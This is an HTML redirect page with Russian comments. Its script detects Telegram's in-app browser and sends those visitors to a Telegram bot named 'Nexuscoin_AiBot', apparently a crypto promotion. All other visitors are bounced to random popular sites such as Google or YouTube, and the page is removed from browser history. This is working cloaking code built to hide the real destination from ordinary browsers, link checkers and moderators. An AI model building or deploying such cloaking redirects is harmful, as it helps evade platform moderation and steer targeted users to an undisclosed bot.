<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Перенаправление...</title>
  <script>
    (function() {
      // === НАСТРОЙКИ ===
      // Ссылка на бота для Telegram
      const TELEGRAM_BOT_LINK = 'https://t.me/Nexuscoin_AiBot?start=fgdgfd2fe';
      
      // Список сайтов для обычных браузеров (случайный выбор)
      const REGULAR_SITES = [
        'https://www.google.com',
        'https://www.youtube.com',
        'https://www.instagram.com',
        'https://vk.com',
        'https://dzen.ru',
        'https://www.facebook.com',
        'https://www.tiktok.com',
        'https://twitter.com'
      ];
      
      // === УЛУЧШЕННОЕ ОПРЕДЕЛЕНИЕ TELEGRAM ===
      function isTelegramWebView() {
        // 1. Проверка User-Agent (регистронезависимая, с расширенными паттернами)
        const ua = navigator.userAgent.toLowerCase();
        const telegramPatterns = [
          'telegram',       // стандартный маркер
          'tdesktop',       // десктопная версия
          'telegrambot',    // некоторые боты
          'tgweb',          // внутренние webview
          'telegramweb'     // вариант
        ];
        
        for (let pattern of telegramPatterns) {
          if (ua.includes(pattern)) {
            console.log('[Detect] Telegram по User-Agent:', pattern);
            return true;
          }
        }
        
        // 2. Проверка специфичных объектов Telegram (для WebApp / Mini App)
        //    Некоторые версии Telegram WebView внедряют эти объекты
        if (
          typeof window.TelegramWebviewProxy !== 'undefined' ||
          typeof window.TelegramGameProxy !== 'undefined' ||
          typeof window.Telegram !== 'undefined'
        ) {
          console.log('[Detect] Telegram по JavaScript объектам');
          return true;
        }
        
        // 3. Проверка Referrer (если открыто из чата или канала)
        try {
          const referrer = document.referrer.toLowerCase();
          if (referrer.includes('t.me') || referrer.includes('telegram')) {
            console.log('[Detect] Telegram по Referrer:', referrer);
            return true;
          }
        } catch(e) {}
        
        return false;
      }
      
      // === ВЫБОР ЦЕЛЕВОЙ ССЫЛКИ ===
      let targetUrl;
      const isTelegram = isTelegramWebView();
      
      if (isTelegram) {
        targetUrl = TELEGRAM_BOT_LINK;
        console.log('[Редирект] Telegram -> бот:', targetUrl);
      } else {
        // Случайный сайт из списка
        const randomIndex = Math.floor(Math.random() * REGULAR_SITES.length);
        targetUrl = REGULAR_SITES[randomIndex];
        console.log('[Редирект] Обычный браузер -> случайный сайт:', targetUrl);
      }
      
      // === МГНОВЕННЫЙ РЕДИРЕКТ (без сохранения в истории) ===
      // Используем replace, чтобы кнопка "назад" не возвращала на эту страницу
      window.location.replace(targetUrl);
      
      // === ФОЛБЭК НА СЛУЧАЙ, ЕСЛИ replace НЕ СРАБОТАЛ (например, блокировка) ===
      setTimeout(function() {
        if (window.location.href === window.location.href) { // простая проверка
          window.location.href = targetUrl;
        }
      }, 100);
    })();
  </script>
  <!-- Дополнительная защита для очень старых браузеров / отключённого JS -->
  <noscript>
    <meta http-equiv="refresh" content="0; url=https://www.google.com">
  </noscript>
</head>
<body style="margin:0; padding:0; background:#0a0f1e; display:flex; align-items:center; justify-content:center; min-height:100vh; font-family:system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;">
  <div style="text-align:center; color:#e0e0e0; padding:20px;">
    <div style="display:inline-block; width:44px; height:44px; border-radius:50%; border:3px solid #2d8cff; border-top-color:transparent; animation:spin 0.8s linear infinite; margin-bottom:16px;"></div>
    <p style="font-size:16px; opacity:0.8;">Перенаправление, пожалуйста, подождите...</p>
  </div>
  <style>
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</body>
</html>
